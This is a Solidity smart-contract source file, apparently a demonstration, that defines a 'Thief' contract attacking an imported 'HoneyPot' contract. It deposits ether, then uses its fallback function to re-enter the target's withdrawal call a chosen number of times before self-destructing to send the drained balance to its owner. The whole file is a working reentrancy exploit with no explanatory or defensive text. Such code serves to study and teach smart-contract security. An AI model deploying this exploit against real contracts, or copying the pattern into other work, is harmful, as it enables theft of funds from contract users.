pragma solidity 0.4.18;

import "./HoneyPot.sol";

contract Thief {
    address honeypot;
    address owner;
    uint count;
    bytes32 signature;

    function Thief(address honeypotAddress, uint howManyTimes)
    public
    payable
    {
      owner = msg.sender;
      honeypot = honeypotAddress;
      count = howManyTimes;

      HoneyPot honeypotInstance = HoneyPot(honeypot);
      honeypotInstance.put.value(msg.value)();
    }

    function get()
    public
    {
      count--;
      HoneyPot honeypotInstance = HoneyPot(honeypot);
      honeypotInstance.get();
    }

    function ()
    public
    payable
    {
      if (count > 0) {
        get();
      }
    }

    function goodbye ()
    public
    {
      selfdestruct(owner);
    }
}
